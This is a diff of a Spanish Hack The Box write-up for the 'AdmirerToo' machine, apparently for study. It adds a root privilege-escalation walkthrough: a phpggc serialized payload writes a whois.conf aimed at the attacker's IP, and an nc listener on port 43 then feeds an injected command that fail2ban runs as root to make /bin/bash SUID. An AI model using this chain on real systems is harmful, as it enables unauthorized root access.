@@ -1,17 +1,17 @@
-#Author: José Luis Íñigo
+![](2022-06-21-10-50-28.png)
 
-#Nickname: Riskoo
 
-#Bibliographical sources: S4vitar https://www.youtube.com/watch?v=YmZLdJRBKv0&
+![](2022-06-21-10-50-47.png)
 
-#Machine Admirertoo Hack the box
 
-#OSCP Style : PHP SSRF RCE CVE PASSWORD 
 
-#REUSE eWPT eWPTXv2 OSWE
-
-#Skills: Subdomain Enumeration Adminer Enumeration SSRF (Server Side Request Forgery) in Adminer [CVE-2021-21311] Abusing redirect to discover internal services OpenTSDB Exploitation [CVE-2020-35476] [Remote Code Execution] Searching for valid metrics OpenCats PHP Object Injection to Arbitrary File Write Abusing Fail2ban [Remote Code Execution] (CVE-2021-32749) Playing with phpggc in order to serialize our data Abusing whois config file + OpenCats + Fail2ban [Privilege Escalation]
-
+- #Author: José Luis Íñigo
+- #Nickname: Riskoo
+- #Bibliographical sources: S4vitar https://www.youtube.com/watch?v=YmZLdJRBKv0&
+- #Machine Admirertoo Hack the box
+- #OSCP Style : PHP SSRF RCE CVE PASSWORD 
+- #REUSE eWPT eWPTXv2 OSWE
+- #Skills: Subdomain Enumeration Adminer Enumeration SSRF (Server Side Request Forgery) in Adminer [CVE-2021-21311] Abusing redirect to discover internal services OpenTSDB Exploitation [CVE-2020-35476] [Remote Code Execution] Searching for valid metrics OpenCats PHP Object Injection to Arbitrary File Write Abusing Fail2ban [Remote Code Execution] (CVE-2021-32749) Playing with phpggc in order to serialize our data Abusing whois config file + OpenCats + Fail2ban [Privilege Escalation]
 
 ## Comnenzamos con el mapeado
 Encontramos poco solo que el puerto 22 y 80 están abiertos
@@ -550,9 +550,113 @@ jennifer@admirertoo:/$ find -group devel -type d 2>/dev/null
 ./usr/local/etc
 ```
 
-"De momentos" esos archivos no nos interesan , seguimos investigando
+"De momentos" estas
+
+El escribir en este caso pues como que en principio no podemos hacer nada interesante al no poder ejecutar,pero está bien tenerlo, vamos a comprobar si usando phpgcc podemos escribir en estos directorios alguna información que nos interese. Phpgcc lo hemos encontrado al ver que opencats tiene esta vulnerabilidad, buscando en google.
+
+Vamos a usar el phpgcc para meter un payload serializado en la url. Por lo que nos lo clonamos en nuestro pc. El objetivo es que pasando por url el payload serializado obtenido por phpgcc escriba en nuestro directorio algo que nos interesa.
+
+```bash
+# Ya viene compilado
+git clone https://github.com/ambionics/phpggc
+```
+![](2022-06-21-09-45-38.png)
 
 
-https://www.youtube.com/watch?v=YmZLdJRBKv0&t=4886s
+
+Miramos los procesos y observamos que de omment solo tenemos acceso a los procesos de jennifer
+
+![](2022-06-21-10-09-29.png)
+
+El motivo es porque proc tiene la flag idepid=2 que hace que solo puedan ver los procesos del mismo usuario
+
+![](2022-06-21-10-10-28.png)
+
+Seguimos investigando y por ejemplo en la zona de los log /var/log podemos ver alguna que otra aplicación. En este caso podemos observar que tiene fail2ban, aquí vamos a tiro hecho porque la máquina nos decía que íbamos a probar esto.
+
+![](2022-06-21-10-12-25.png)
 
 
+Fail2ban lo que hace es que después de x intentos te bloquea. 
+Hemos buscado en google **fail2ban exploit** y encontramos que cuando te bloquean se ejecuta como root un comando
+
+![](2022-06-21-10-14-21.png)
+
+Este comando nos cometan que escapando ~! pdoemos inyectar nuestro código , necesitariamos ir viendo cosas como donde está el arhivo de configuración de whois
+
+Buscando no encontramos así que o no existe o no tenemos permisos para leerlo a simple vista.
+
+Intentamos hacer un whois a nuestra ip y vemos que no hace nada visutalmente por lo que le metemos un strace delante para ver la traza de lo que se ha hecho a más bajo nivel.
+
+```bash
+strace whois 127.0.0.1
+```
+
+Observamos el código para ver si encontramos por ejemplo en este caso el archivo de configuración y vemos que se encuentra alojado en la ruta /usrc/local/etc la cual vimos antes que podíamos escribir
+
+![](2022-06-21-10-22-14.png)
+
+Por lo que intentaremos sobreescribir el whois o crearlo a través del phpgcc 
+>importante es que tendría que seguir el formato suyo porque si no lo hacemos sale lo siguiente:
+
+![](2022-06-21-10-24-55.png)
+
+Buscamos en el whois de github el whois.c para ver la configuración y encontramos como busca la concordancia
+![](2022-06-21-10-29-42.png)
+
+Al ver que hay 512 de buffer y que queremos que no lea cierta parte del código que hemos "copiado su extructura" de whois, pues lo quehacemos es meterle una serie de espacions. Como hacemos esto?, por ejemplo:
+
+```pthon3
+python3 -c 'print("]*10.10.14.29 10.10.14.29" + " "*500)'
+```
+![](2022-06-21-10-33-37.png)
+
+Lo guardamos en whois.conf y ejecutamos el phpggc
+
+![](2022-06-21-10-35-12.png)
+
+Metemos la data después de DataGrid=
+![](2022-06-21-10-36-45.png)
+
+
+
+y ahora en el archivo que se ha creado, vemos que tiene
+
+![](2022-06-21-10-35-57.png)
+
+
+Ahora nos ponemos en escucha por el puerto 43 que es por donde opea el whois
+```bash
+nc -nlvp 43
+```
+
+Si ahora funciona lo que hemos hecho si hacemos un whois a nuestra ip 10.10.14.29 deberíamos de recibir una petición
+
+![](2022-06-21-10-39-03.png)
+
+Como hemos recibido la petición ahora si podemos meterle un input. ¿Cómo lo hacemos?
+Según vimos metiendo en un archivito ~! , podemos meter luego un código que será ejecutado por root.
+Realmente podemos hacer muchas cosas pero en este caso en vez de una revert shell lo que vamos a hacer es dar privilegios u+s a bin bash.
+Para ejecutar esto tendría que banearnos.
+![](2022-06-21-10-42-48.png)
+
+Haremos para banearnos intentos de ssh varias veces hasta que nos banee
+
+Nos ponemos en escucha por el puerto 43 como antes pero le pasamos el arhivo pwned que es el que hemos hecho con los permisos u+s a bin/bash
+
+```bash
+nc -nlvp 43 < pwned
+```
+
+![](2022-06-21-10-44-38.png)
+
+
+Después de varios intentos de entrar por ssh cualquiera a la máquina, parece que recibimos una petición. En esta supuestamente le hemos inyectado el pwned y fail2ban ha cogido y ejecutado whois que en este caso tiene el chmod para darnos permisos.
+
+En principio debemos de estar baneados, nos conectamos por ssh como jennifer
+
+![](2022-06-21-10-49-25.png)
+
+Vemos que ya somos root
+
+![](2022-06-21-10-49-53.png)
